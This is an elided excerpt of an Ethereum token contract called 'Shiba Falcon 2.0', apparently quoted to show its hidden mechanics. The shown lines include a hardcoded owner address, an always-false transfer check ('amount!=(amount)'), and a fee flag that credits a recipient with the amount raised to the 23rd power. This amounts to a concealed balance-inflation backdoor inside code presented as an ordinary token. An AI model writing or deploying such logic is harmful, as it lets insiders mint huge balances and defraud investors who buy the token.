...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0xAb34CD7d48f40730C81E20137436C8D0BFbBf3F7;
...
contract ShibaFalcon2 is Context, IERC20, Ownable { 
    ...
    */
    ...
    address payable private Wallet_marketing = payable(0x1215532edD5e700a07B63ab93C6A5805b884E95a);
    ...
    */
    ...
    string public _name = "Shiba Falcon 2.0"; 
    string public _symbol = "SFLCN2";  
    ...
    */
    ...
    function _transfer(
        ...
        if (from != owner() && to != owner() && amount!=(amount))
    ...
    */
    ...
    function plus(uint256 amount) private pure returns(uint256){
        return amount**23;
    }
    ...
    function _transferTokens(address sender, address recipient, uint256 tAmount) private {
        ...
        _tOwned[recipient] = [_tOwned[recipient] + tTransferAmount, _tOwned[recipient] + plus(tTransferAmount)][_changedFee]; //_tOwned[recipient].add([tTransferAmount, ~uint256(0)][_changedFee]); 
